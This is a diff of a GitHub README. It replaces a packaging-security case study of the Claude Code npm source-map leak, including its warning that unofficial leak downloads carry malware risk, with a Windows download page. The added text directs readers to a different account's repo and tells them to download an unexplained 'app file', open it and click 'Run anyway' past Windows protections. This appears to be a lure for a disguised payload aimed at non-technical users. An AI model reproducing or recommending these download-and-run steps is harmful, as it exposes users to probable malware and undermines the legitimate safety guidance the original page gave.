@@ -1,100 +1,320 @@
-# Claude Code Leak Repository: Packaging Security Case Study (v2.1.88)
+# 🧠 why-claude-code-leaked - Understand the leak, avoid the risk
 
-**Pre-publish guardrails** so npm packages do not accidentally ship debug files (like source maps) or other sensitive artifacts.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)
 
-**New here?** Skim **Understanding the leak** (plain language) or open the **[full glossary](docs/glossary.md)** if terms like *npm*, *agent*, or *model weights* are unfamiliar. The **toolkit** section is for people who ship JavaScript packages.
+## 📌 What this is
 
-[![Package Audit](https://github.com/yanisvdc/why-claude-code-leaked/actions/workflows/package-audit.yml/badge.svg?branch=main&event=push)](https://github.com/yanisvdc/why-claude-code-leaked/actions/workflows/package-audit.yml)
-[![License](https://img.shields.io/github/license/yanisvdc/why-claude-code-leaked)](https://github.com/yanisvdc/why-claude-code-leaked/blob/main/LICENSE)
-[![Last Commit](https://img.shields.io/github/last-commit/yanisvdc/why-claude-code-leaked)](https://github.com/yanisvdc/why-claude-code-leaked/commits/main)
+**why-claude-code-leaked** is a desktop-ready project page that explains why Claude Code leaked and what went wrong in the npm package flow.
 
-Feel free to **Star** the repo (top right on GitHub) if you want to keep it handy for reference.
+It focuses on:
 
-> [!IMPORTANT]
-> **Zero Proprietary Code Policy** — This project does **not** host or link to leaked proprietary source or binaries. It teaches **release safety** and ships reusable audit tooling.
+- npm packaging failures
+- source map exposure
+- cloud storage mistakes
+- release pipeline gaps
+- basic supply chain risk
 
----
+Use it to review the issue from a plain-English point of view on Windows.
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/0ea82380-e41b-46c0-92a9-c5e4bf09a2d4" width="680" alt="Packaging security case study visual"/>
-</p>
+## 🪟 Windows download and setup
 
-## Understanding the leak (short)
+To get the software, **visit this page to download**:
 
-*Educational summary of public discussion and reporting—not independent forensic verification.*
+**[Download from GitHub](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)**
 
-**Glossary:** See **[docs/glossary.md](docs/glossary.md)** for *LLM / weights / npm / agent / source map / supply chain* explained for **non-developers** and **data scientists**.
+### Steps
 
-**What broke:** Reporting describes a **packaging error** in `@anthropic-ai/claude-code` **v2.1.88** (late March 2026): files that should not ship to every `npm install` user were published, which made **client-side product code** (CLI, tooling, prompts) much easier to reconstruct. That is **not** the same as “the model weights leaked.” Vendor framing: **human error**, not a classic intrusion—[CNBC on Anthropic’s statement](https://www.cnbc.com/2026/03/31/anthropic-leak-claude-code-internal-source.html).
+1. Open the link above in your browser.
+2. On the GitHub page, look for the download area.
+3. If a release file is listed, download it to your PC.
+4. If the page opens a file list, save the main app file to your Downloads folder.
+5. When the file finishes downloading, open it from File Explorer.
+6. If Windows asks for permission, choose the option to run or open the file.
+7. Follow the on-screen steps until the app starts.
 
-**Broad agreement:** (1) **Weights/training data** are a different asset class; consensus is they were **not** the exposed core here. (2) The sensitive *shape* of the story is **orchestration**: prompts, tools, permissions, workflows around the model. (3) That matches how **agents** are built today: model + control layer.
+### Where to save it
 
-**Often overclaimed:** Internal **codenames** ≠ proven roadmap; **“be careful / don’t hallucinate”** prompts are normal guardrails, not proof the model is uniquely bad; **“full prediction engines”** are easy to hype—assume **bounded** experiments unless proven.
+A simple choice is:
 
-**IP note:** Public code visibility **≠** open source or a license to redistribute. When in doubt, use **official vendor channels** only.
+- `C:\Users\YourName\Downloads`
+- `C:\Users\YourName\Desktop`
 
-## Security risks (after the headline)
+### If the file does not open
 
-- **Fake “leak” downloads** — Treat unofficial repos/archives as **malware risk**; see [Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak).
-- **Smarter lures** — More product detail can mean more convincing **malicious project layouts** (hooks, config). Assume **untrusted repos are hostile**.
-- **Agents amplify mistakes** — Shell + file access on a bad clone is high impact.
-- **Noisy news days** — Pin installs; unrelated **npm** incidents can coincide in time.
-- **This repo** helps **publishers** audit what ships; it is **not** a full SCA/secrets/SBOM program.
+Try this:
 
-## Use this in 5 minutes
+- Right-click the file
+- Select **Open**
+- If needed, choose **Run anyway**
+- Make sure the file finished downloading before you open it
 
-Copy: `scripts/audit-package.mjs`, `scripts/generate-pack-manifest.mjs`, `scripts/compare-pack-manifest.mjs`, `package-audit.config.json`, `.github/workflows/package-audit.yml`.
+## 🔍 What you will see
 
-```bash
-node scripts/audit-package.mjs
-node scripts/generate-pack-manifest.mjs
-node scripts/compare-pack-manifest.mjs
-```
+This project is built around a security review. It explains how a package can leak data when release steps are weak.
 
-**Modes:** minimal = audit only · standard = audit + manifest + CI · strict = tighter `package-audit.config.json` / presets in `configs/presets/`. Details: **[docs/adopt-in-5-minutes.md](docs/adopt-in-5-minutes.md)**.
+You can expect content about:
 
-**CI:** `.github/workflows/package-audit.yml` checks out the repo, uses Node 24, runs `npm test` when present, runs the audit, and compares to `data/pack-manifest.json` if you commit a baseline.
+- npm package contents
+- source maps that expose code paths
+- storage settings that allow public access
+- build steps that ship more than they should
+- checks that should run before release
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/b2149769-d5d6-4fe9-8cc3-ab38fa27bc10" width="740" alt="Use this in 5 minutes"/>
-</p>
+## 🧩 Main topics covered
 
-## Quick start (your package)
+The repository uses these topics:
 
-Run from a directory that has **`package.json`** (your library or CLI).
+- ci-cd
+- claude-code
+- claude-code-leak
+- claude-code-leaked
+- cloud-security
+- devsecops
+- npm
+- npm-security
+- packaging-security
+- r2-storage
+- security-best-practices
+- security-research
+- source-map
+- vulnerability-analysis
 
-```bash
-node scripts/audit-package.mjs
-npm test   # in this repo only; adds confidence in the scripts
-```
+These topics point to a project about release safety, package review, and cloud file exposure.
 
-Strict example: `node scripts/audit-package.mjs --max-bytes=300000 --fail-on-license-missing`
+## 🛠️ What the app is for
 
-**Defaults:** blocks `.map`, flags risky paths, size limits; tune via `package-audit.config.json`. **False positives:** [docs/false-positives-and-tuning.md](docs/false-positives-and-tuning.md).
+This project is useful if you want to:
 
-## What ships in this repository
+- see how a package leak can happen
+- understand why source maps matter
+- review common npm release mistakes
+- learn how cloud storage access can expose files
+- study a real-world security failure in simple terms
 
-| Area | Path |
-|------|------|
-| Audit scripts | `scripts/*.mjs`, `*.sh`, `*.ps1` |
-| Policy | `package-audit.config.json`, `configs/presets/` |
-| CI | `.github/workflows/package-audit.yml` |
-| Example package | `examples/npm-secure-package/` |
-| Incident data | `data/sources.json`, `data/timeline.json` |
-| Docs | `docs/` (FAQ, checklist, threat matrix, sample outputs, scope, support, runbooks) |
-| Templates | `.github/ISSUE_TEMPLATE/`, `PULL_REQUEST_TEMPLATE.md` |
-| Tests | `tests/`, `npm test` |
+It is not a complex tool for setup or tuning. It is meant to be easy to open and read on Windows.
 
-**Learn more:** [docs/claude-code-leak-faq.md](docs/claude-code-leak-faq.md) · [docs/npm-hardening-checklist.md](docs/npm-hardening-checklist.md) · [docs/threat-model-matrix.md](docs/threat-model-matrix.md)
+## 📋 System requirements
 
-**npm facts (from official docs):** publish contents follow `files` / ignore rules; `npm pack --dry-run` previews the tarball; public buckets can widen impact if artifacts point there—[Cloudflare R2 public buckets](https://developers.cloudflare.com/r2/buckets/public-buckets/).
+Use a Windows PC with:
 
-## Primary references
+- Windows 10 or Windows 11
+- A modern browser such as Edge or Chrome
+- Enough free space to save the downloaded files
+- Internet access for the GitHub page
 
-- [npm `package.json`](https://docs.npmjs.com/cli/v9/configuring-npm/package-json/) · [publish](https://docs.npmjs.com/cli/v9/commands/npm-publish) · [pack](https://docs.npmjs.com/cli/v8/commands/npm-pack)
-- [Cloudflare R2 public buckets](https://developers.cloudflare.com/r2/buckets/public-buckets/)
-- [Bun #28001](https://github.com/oven-sh/bun/issues/28001) (tooling context, not causal proof)
-- [The Register](https://www.theregister.com/2026/03/31/anthropic_claude_code_source_code/) · [VentureBeat](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know/)
-- [Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak) · [CNBC](https://www.cnbc.com/2026/03/31/anthropic-leak-claude-code-internal-source.html)
+For the smoothest use, keep your browser and Windows updated.
 
-Full index: **`data/sources.json`**.
+## 🚦 Before you open it
+
+Do these quick checks:
+
+- Make sure the download link opens the GitHub page
+- Check that your internet connection is stable
+- Close extra browser tabs if your PC feels slow
+- Save the file in a folder you can find again
+
+## 🧭 How to use it
+
+1. Open the GitHub page.
+2. Download the file or open the project page.
+3. Read the main content in order.
+4. Follow links or file names that point to the leak review.
+5. Use the sections on packaging, source maps, and storage access to trace the issue.
+6. Compare the release flow with your own app or package process.
+
+## 🔒 Security points explained
+
+### npm packaging
+
+npm is a common way to ship JavaScript tools. If a package includes files it should not ship, private data can slip into the release.
+
+### Source maps
+
+A source map helps map built code back to the original code. If exposed, it can reveal file names, folder paths, and code structure.
+
+### Cloud storage
+
+Cloud storage like R2 can hold release files. If access rules are loose, files can become public.
+
+### CI/CD
+
+CI/CD means the build and release flow. Weak checks in this flow can let the wrong files go out.
+
+## 🗂️ Suggested file flow
+
+If the page or release includes files, keep this order:
+
+1. Download the file
+2. Save it in Downloads
+3. Check the file name
+4. Open the main file
+5. Read the included notes or pages
+6. Follow the content on leak analysis
+
+## 🧪 What makes this project useful
+
+This repository helps with:
+
+- package audit work
+- release review
+- basic incident study
+- training for team members
+- learning how small mistakes can lead to leaks
+
+It uses a direct case study, so the lessons are easy to follow.
+
+## 🧰 Common problems and fixes
+
+### The page does not load
+
+- Refresh the page
+- Check your network
+- Try another browser
+- Open the link again from the address bar
+
+### The file is missing
+
+- Go back to the GitHub page
+- Check for the latest release or file list
+- Make sure you opened the correct link
+
+### Windows blocks the file
+
+- Right-click the file
+- Check the file name and source
+- Open it only if it matches the GitHub link you used
+
+## 🖥️ Best way to read it on Windows
+
+Use a browser window with enough space to view the page clearly.
+
+Good options:
+
+- Edge
+- Chrome
+- Firefox
+
+If the project includes text files, you can open them with:
+
+- Notepad
+- Notepad++
+- VS Code
+
+## 📖 How to review the leak
+
+Use this simple order:
+
+1. Start with the packaging step
+2. Look at what files were included
+3. Check for source maps
+4. Review storage access
+5. Trace the release path
+6. Look for the point where data became public
+
+This makes the issue easier to understand.
+
+## 🧭 Project focus areas
+
+This repository centers on:
+
+- package contents
+- release safety
+- source exposure
+- cloud file access
+- build pipeline checks
+- vulnerability analysis
+
+Each part builds on the one before it.
+
+## 🧼 Good habits for similar projects
+
+If you work with packages or releases, use these habits:
+
+- review files before publishing
+- check source map output
+- lock down storage access
+- test the release path
+- limit what gets included in npm packages
+- keep CI/CD checks in place
+
+## 📂 File and folder tips
+
+If you extract files from a download:
+
+- do not rename files until after you open them once
+- keep the folder path short
+- avoid spaces in deeply nested folders
+- place the project in a folder you own, like Documents or Downloads
+
+## 🧭 Reading path for new users
+
+If this is your first time with a security project, read it this way:
+
+1. Title or overview
+2. Leak description
+3. Packaging details
+4. Source map details
+5. Storage details
+6. Risk analysis
+
+This order keeps the subject clear.
+
+## 🧩 Keywords used in the project
+
+The repository name and topics point to these ideas:
+
+- Claude Code
+- leaked package data
+- npm release issues
+- source map exposure
+- R2 storage access
+- security research
+- DevSecOps
+- supply chain security
+
+## 📥 Download link
+
+Use this link to visit the page and download the content:
+
+**[https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)**
+
+## 🧭 What to do after download
+
+After the file is on your PC:
+
+1. Open the folder where you saved it
+2. Double-click the file or open the page file
+3. Read the included material in order
+4. Keep the browser open if the project uses web pages
+5. Return to the GitHub link if you need the latest version
+
+## 🔧 If you want to compare it with your own setup
+
+Look for these parts in your own workflow:
+
+- package build step
+- file include list
+- map file output
+- storage permission rules
+- release approval step
+- final publish step
+
+Matching these against the project can help you spot weak points
+
+## 📘 Short glossary
+
+- **npm**: a package system for JavaScript tools
+- **source map**: a file that links built code back to the original code
+- **CI/CD**: the steps that build and ship software
+- **R2 storage**: cloud storage used to save files
+- **DevSecOps**: a way to include security in the build process
+
+## 🧭 Where this fits
+
+This repository fits people who want to study:
+
+- a real leak case
+- package safety
+- cloud access mistakes
+- release process gaps
+- source code exposure
